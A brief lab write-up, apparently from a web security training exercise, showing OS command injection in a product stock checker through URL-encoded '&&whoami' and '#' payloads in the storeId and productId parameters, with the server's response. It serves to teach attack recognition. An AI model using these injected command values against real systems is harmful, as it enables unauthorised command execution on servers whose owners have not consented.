# OS command injection, simple case

This lab contains an OS command injection vulnerability in the product stock checker.

```http
POST /product/stock HTTP/1.1

productId=10&storeId=1%26%26whoami
```

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Connection: close
Content-Length: 16

52
peter-GO0II3
```

Note that `%26` is the url-encoded `&`. Both parameters are vulnerable so other payloads work such as `productId=10+%26%26+whoami+%23` in which `%23` is the `#` character making the rest of the command a comment.
